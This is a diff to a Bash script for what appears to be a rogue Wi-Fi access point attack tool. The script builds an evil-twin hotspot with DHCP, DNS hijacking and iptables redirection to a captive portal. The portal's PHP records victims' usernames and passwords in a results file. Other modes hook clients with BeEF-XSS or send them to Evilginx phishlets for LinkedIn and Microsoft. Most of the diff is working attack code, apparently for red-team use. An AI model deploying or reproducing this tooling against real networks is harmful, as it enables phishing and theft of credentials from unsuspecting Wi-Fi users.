@@ -1,5 +1,8 @@
 #!/bin/bash
 
+SCRIPT_DIRECTORY="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
+source "$SCRIPT_DIRECTORY/lib/session.sh" || exit 1
+
 RED='\033[0;31m'
 BRED='\033[1;31m'
 GREEN='\033[1;32m'
@@ -563,7 +566,7 @@ DIR_WEB=/var/www/html/
 
 FILE_hostapd="hostapd.conf"
 
-DIR_APACHE_SITE="/etc/apache2/sites-available"
+DIR_APACHE_SITE="/etc/apache2/sites-available/"
 FILE_default="000-default.conf"
 FILE_ssl="default-ssl.conf"
 FILE_htaccess="htaccess"
@@ -615,22 +618,22 @@ ask_interface_out(){
 
 rules_iptables_ipforward(){
 
-    sudo sysctl -w net.ipv4.ip_forward=1
+    session_enable_forwarding || return 1
     
-    iptables -t nat -A POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE
+    session_iptables -t nat -A POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE || return 1
 
     # Permitir acceso al portal
-    iptables -A FORWARD -i $SELECTED_INTERFACE -d $IP_PORTAL -j ACCEPT
+    session_iptables -A FORWARD -i $SELECTED_INTERFACE -d $IP_PORTAL -j ACCEPT || return 1
 
     # Bloquear tráfico de los clientes excepto al portal cautivo (80, 443)
-    sudo iptables -A FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT
+    session_iptables -A FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT || return 1
 
     #Peticiones HTTP/S van al portal de apache2
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"
+    session_iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP" || return 1
+    session_iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS" || return 1
     #Todas las peticiones se van al dns local
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
+    session_iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS" || return 1
+    session_iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS" || return 1
 
 }
 
@@ -725,7 +728,7 @@ EOF
 <?php
 
 // Ruta al archivo donde guardar credenciales
-$file = '/var/www/html/creds.txt';
+$file = '__POCKET_RESULTS_FILE__';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = htmlspecialchars($_POST['username'] ?? '');
@@ -739,10 +742,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     file_put_contents($file, $data, FILE_APPEND);
 
     // Permitir tráfico a la IP registrada
-    shell_exec("sudo iptables -D FORWARD -s $ip -j ACCEPT 2>/dev/null");
-    shell_exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
-    shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s $ip -j RETURN");
-    shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s $ip -j RETURN");
+    shell_exec("sudo iptables -D FORWARD -s $ip -m comment --comment __POCKET_SESSION_TAG__ -j ACCEPT 2>/dev/null");
+    shell_exec("sudo iptables -I FORWARD -s $ip -m comment --comment __POCKET_SESSION_TAG__ -j ACCEPT");
+    shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s $ip -m comment --comment __POCKET_SESSION_TAG__ -j RETURN");
+    shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s $ip -m comment --comment __POCKET_SESSION_TAG__ -j RETURN");
 
     // Establecer cookie de autenticación 
     setcookie("auth", "ok", time()+18000 , "/");
@@ -896,39 +899,41 @@ configure_apache2(){
     -keyout /etc/ssl/private/captive-portal.key \
     -out /etc/ssl/certs/captive-portal.crt \
     -days 365 -nodes \
-    -subj "/C=ES/ST=Catalunya/L=Barcelona/O=CaptivePortal/OU=IT/CN=captive.portal" > /dev/null
+    -subj "/C=ES/ST=Catalunya/L=Barcelona/O=CaptivePortal/OU=IT/CN=captive.portal" > /dev/null || return 1
 
     
     #Desactivamos las paginas webs para cambiar la configuración
-    sudo a2dissite 000-default.conf > /dev/null
-    sudo a2dissite default-ssl.conf > /dev/null
+    session_apache a2dissite 000-default.conf > /dev/null || return 1
+    session_apache a2dissite default-ssl.conf > /dev/null || return 1
 
     # Por si acaso activamos los modulos de rewrite y ssl de apache (Normalmente viene activo)
-    sudo a2enmod rewrite > /dev/null
-    sudo a2enmod ssl > /dev/null
+    session_apache a2enmod rewrite > /dev/null || return 1
+    session_apache a2enmod ssl > /dev/null || return 1
 }
 configure_beef_local(){
     
     if [ -d /etc/beef-xss ]; then
-        sudo cp ./templates/beef/config.yaml /etc/beef-xss/config.yaml
-        sudo chown beef-xss:beef-xss /etc/beef-xss/config.yaml
+        sudo cp ./templates/beef/config.yaml /etc/beef-xss/config.yaml || return 1
+        sudo chown beef-xss:beef-xss /etc/beef-xss/config.yaml || return 1
 
     else
         echo "The directory /etc/beef-xss does not exist"
         return 1
     fi
 
-    sudo cp /etc/ssl/private/captive-portal.key /etc/beef-xss/
-    sudo cp /etc/ssl/certs/captive-portal.crt /etc/beef-xss/
-    sudo chmod 644 /etc/beef-xss/captive-portal.key
-    sudo chmod 644 /etc/beef-xss/captive-portal.crt
-    sudo chmod o+x /etc/beef-xss
+    sudo cp /etc/ssl/private/captive-portal.key /etc/beef-xss/ || return 1
+    sudo cp /etc/ssl/certs/captive-portal.crt /etc/beef-xss/ || return 1
+    sudo chown beef-xss:beef-xss /etc/beef-xss/captive-portal.key || return 1
+    sudo chmod 600 /etc/beef-xss/captive-portal.key || return 1
+    sudo chmod 644 /etc/beef-xss/captive-portal.crt || return 1
 
     return 0
 
 }
 
 move_files_created(){
+
+    session_prepare_web_files || return 1
 
     #Archivos de dhcp sercer
     sudo cp "${DIRECTORY}${FILE_isc}" "${DIR_ETC_DEFAULT}${FILE_isc}"
@@ -995,20 +1000,13 @@ move_files_created(){
     #Permisos pagina web
     sleep 1
 
-    sudo touch /var/www/html/creds.txt
-    check_success "touch /var/www/html/creds.txt"
-
-    sudo chmod -R 777 /var/www/html
-    check_success "chmod 664 /var/www/html/*"
-
-    sudo chown www-data:www-data /var/www/html/*
-    check_success "chown www-data:www-data /var/www/html/*"
+    session_web_permissions || return 1
 
 }
 
 activate_dhcp(){
 
-    if sudo systemctl restart isc-dhcp-server ; then
+    if session_service restart isc-dhcp-server ; then
         echo "Succesful DHCP Server"
         return 0
     else
@@ -1020,7 +1018,7 @@ activate_dhcp(){
 
 activate_dns(){
 
-    if sudo systemctl restart dnsmasq ; then
+    if session_service restart dnsmasq ; then
         echo "Succesful DNS Server"
         return 0
     else
@@ -1032,17 +1030,17 @@ activate_dns(){
 
 activate_apache2(){
 
-    if ! sudo a2ensite 000-default.conf > /dev/null ;then
+    if ! session_apache a2ensite 000-default.conf > /dev/null ;then
         echo "Can't enable site 000-default"
         return 1
     fi
     
-    if ! sudo a2ensite default-ssl.conf > /dev/null;then
+    if ! session_apache a2ensite default-ssl.conf > /dev/null;then
         echo "Can't enable site default-ssl"
         return 1
     fi 
     
-    if ! sudo systemctl restart apache2 > /dev/null; then 
+    if ! session_service restart apache2 > /dev/null; then
         echo "Can't Start Apache Service"
         return 1
     fi
@@ -1077,7 +1075,7 @@ beef_local() {
         return 1
     fi
 
-    if ! sudo systemctl restart beef-xss; then 
+    if ! session_service restart beef-xss; then
         echo "Error initiate beef"
         return 1
     fi
@@ -1149,13 +1147,13 @@ EOF
 \$ip = \$_SERVER['REMOTE_ADDR'];
 
 // Allow internet traffic
-shell_exec("sudo iptables -D FORWARD -s \$ip -j ACCEPT 2>/dev/null");
-shell_exec("sudo iptables -I FORWARD -s \$ip -j ACCEPT");
+shell_exec("sudo iptables -D FORWARD -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j ACCEPT 2>/dev/null");
+shell_exec("sudo iptables -I FORWARD -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j ACCEPT");
 
 
 // Make sure it have dns
-shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -j RETURN");
-shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -j RETURN");
+shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j RETURN");
+shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j RETURN");
 
 // Redirect to phishlet
 header("Location: $URL_PHISHLET_LINKEDIN");
@@ -1213,12 +1211,12 @@ EOF
 \$ip = \$_SERVER['REMOTE_ADDR'];
 
 // Allow internet traffic
-shell_exec("sudo iptables -D FORWARD -s \$ip -j ACCEPT 2>/dev/null");
-shell_exec("sudo iptables -I FORWARD -s \$ip -j ACCEPT");
+shell_exec("sudo iptables -D FORWARD -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j ACCEPT 2>/dev/null");
+shell_exec("sudo iptables -I FORWARD -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j ACCEPT");
 
 // Make sure it have dns
-shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -j RETURN");
-shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -j RETURN");
+shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j RETURN");
+shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -m comment --comment __POCKET_SESSION_TAG__ -j RETURN");
 
 // Redirect to phishlet
 header("Location: $URL_PHISHLET_MICROSOFT");
@@ -1299,47 +1297,14 @@ evilginx_menu(){
 }
 
 turn_off_services(){
-    sudo systemctl stop isc-dhcp-server
-    sudo systemctl stop dnsmasq
-    sudo systemctl stop beef-xss
-    sudo systemctl stop apache2    
+    session_service stop isc-dhcp-server || return 1
+    session_service stop dnsmasq || return 1
+    session_service stop beef-xss || return 1
+    session_service stop apache2 || return 1
 }
 
 cleanup() {
-    echo "[+] Restaurando configuración de red..."
-
-    # Eliminar la regla NAT de POSTROUTING
-    sudo iptables -t nat -D POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE
-
-    # Eliminar la regla hacia el portal
-    iptables -D FORWARD -i $SELECTED_INTERFACE -d $IP_PORTAL -j ACCEPT
-
-    # Eliminar la regla de REJECT para bloquear tráfico de clientes (excepto portal cautivo)
-    sudo iptables -D FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT
-
-    # Eliminar la regla de redirección del tráfico HTTP al portal cautivo
-    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
-    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"
-
-    # Eliminar la regla de redirección DNS UDP (puerto 53) a 192.168.1.1
-    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
-    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
-
-    sudo sysctl -w net.ipv4.ip_forward=0
-    echo "[+] Reglas de iptables eliminadas. Saliendo..."
-
-    sudo ip addr del 192.168.1.1/24 dev $SELECTED_INTERFACE
-
-    sudo ip link set $SELECTED_INTERFACE down
-    sudo iw dev $SELECTED_INTERFACE set type managed
-    sudo ip addr flush dev $SELECTED_INTERFACE
-
-    turn_off_services
-
-    sudo iptables -F -t nat
-
-    sudo rm "${DIRECTORY}"*
-    
+    session_cleanup
 }
 
 set_interface_AP_MODE(){
@@ -1349,20 +1314,22 @@ set_interface_AP_MODE(){
         manager_mode
     fi
    
+    session_command interface || return 1
+
     #Posem la interficie wireless en mode 
-    sudo ip link set $SELECTED_INTERFACE down
-    sudo iw dev $SELECTED_INTERFACE set type ap
-    sudo ip link set $SELECTED_INTERFACE up
+    sudo ip link set $SELECTED_INTERFACE down || return 1
+    sudo iw dev $SELECTED_INTERFACE set type ap || return 1
+    sudo ip link set $SELECTED_INTERFACE up || return 1
 
     #En caso que el usuario tenga ya una ip en la interfaz wifi
-    sudo ip addr flush dev $SELECTED_INTERFACE
+    sudo ip addr flush dev $SELECTED_INTERFACE || return 1
     #sudo macchanger -m $BSSID_VAR $SELECTED_INTERFACE
     #Insertamos una ip a la interficie
-    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE
+    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE || return 1
     check_success "ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE"
 
 }
-false_ap(){
+false_ap() (
 
     if [[ "$WIFI_SELECTED" != "true" ]]; then
         echo "You Don't have a wifi selected"
@@ -1370,16 +1337,18 @@ false_ap(){
         return 1
     fi
     
-    # sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant && sudo airmon-ng check kill
-    sudo systemctl stop NetworkManager 
-    sudo systemctl stop wpa_supplicant
+    session_begin || return 1
+
+    # session_service stop NetworkManager && session_service stop wpa_supplicant && sudo airmon-ng check kill
+    session_service stop NetworkManager || return 1
+    session_service stop wpa_supplicant || return 1
 
 
     VARIATION="$1"
 
     # while DOING = true ;do Deauther 0 ;done # Buscar una manera para poder crear hacer el deauther hasta que quiera que pare.
-    turn_off_services
-    configure_apache2
+    turn_off_services || return 1
+    configure_apache2 || return 1
     
     if [ "$VARIATION" -eq "2" ]; then
         echo "Evilginx Mode"
@@ -1391,7 +1360,7 @@ false_ap(){
 
     fi
 
-    set_interface_AP_MODE
+    set_interface_AP_MODE || return 1
 
     if [ "$VARIATION" -eq "1" ]; then
         echo "Beef Mode"
@@ -1404,15 +1373,15 @@ false_ap(){
     fi
     
 
-    create_all_files_portal
-    move_files_created
+    create_all_files_portal || return 1
+    move_files_created || return 1
     
 
     if ! activate_dhcp; then 
         exit 1
     fi
 
-    ask_interface_out
+    ask_interface_out || return 1
 
     if ! activate_dns; then 
         exit 1
@@ -1422,11 +1391,10 @@ false_ap(){
         exit 1
     fi
 
-    rules_iptables_ipforward
-    sudo hostapd "${DIRECTORY}${FILE_hostapd}" # -B for broadcast
+    rules_iptables_ipforward || return 1
+    session_run_foreground hostapd "${DIRECTORY}${FILE_hostapd}"
 
-    trap cleanup EXIT #Poner
-}
+)
 
 menu(){
     if true; then #./install.sh
